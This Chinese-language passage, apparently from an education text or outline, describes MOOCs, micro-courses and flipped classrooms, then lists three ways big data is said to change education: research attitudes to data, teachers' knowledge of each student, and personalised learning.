MOOC风暴来袭，放大翻转课堂效应。 微课程兴起：回应翻转课堂和MOOC浪潮。 8.3 教育思维 “大数据时代”以不可挡的势头扑面而来，给教育界的人敲响了警钟，告诉他们：“原始”的教育方式已经成为过去，“新时代”已经袭来。 “大数据”并不是一种技术的时尚潮流，而是在信息技术高度发展之后，人们如何开发利用数据为新的商业模式发展奠定基础的过程。与此同时，也是一种基于新工具解决问题的全新思路。 “大数据”怎么样改变传统的教育？ 第一个方面是改变教育研究中对数据价值的认识； 第二个方面是方便校长、教师更全面了解每一个学生； 第三个方面是帮助学生进行个性化高效学习。</summary></entry></feed>